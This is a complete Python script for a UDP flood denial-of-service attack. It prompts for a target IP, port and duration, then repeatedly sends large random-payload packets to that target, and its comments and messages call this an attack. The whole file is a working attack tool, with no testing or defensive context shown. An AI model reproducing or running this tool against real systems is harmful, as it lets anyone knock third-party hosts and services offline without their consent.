import socket
import time
import random
import os

def udp_flood(target_ip, target_port, duration):
  """
  Performs a UDP flood attack on the specified target.

  Args:
    target_ip: The IP address of the target.
    target_port: The port to attack.
    duration: The duration of the attack in seconds.

  Raises:
    KeyboardInterrupt: If the user interrupts the attack.
  """

  try:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
      payload = os.urandom(60010) 
      end_time = time.time() + duration

      while time.time() < end_time:
        sock.sendto(payload, (target_ip, target_port)) 
        # Optional: Print progress 
        print(f"Sent packet to {target_ip}:{target_port} with payload: {payload[:20].hex()}") 

  except KeyboardInterrupt:
    print("\nAttack interrupted by user.")

if __name__ == "__main__":
  try:
    os.system("cls")  # Clear the screen
    target_ip = input("\nEnter a target IP: ")
    duration = int(input("\nEnter a duration for the attack (in seconds): "))
    target_port = int(input("\nEnter a target port: "))
    udp_flood(target_ip, target_port, duration)

  except ValueError:
    print("Invalid input. Please enter valid IP, port, and duration.")